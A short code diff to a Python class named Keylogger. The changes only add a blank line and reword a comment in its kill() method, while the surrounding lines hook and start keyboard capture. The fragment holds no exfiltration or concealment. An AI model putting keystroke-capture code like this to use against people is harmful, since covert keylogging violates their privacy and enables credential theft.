@@ -32,12 +32,13 @@ class Keylogger:
         self.manager.HookKeyboard()
         self.manager.start()
         
+        
     def kill(self):
         """
         Stops logging key events
         """
         
-        # Stops listening for key events (I think?)
+        # Stops listening for key events (I think its the correct function?)
         self.manager.cancel()
         
 
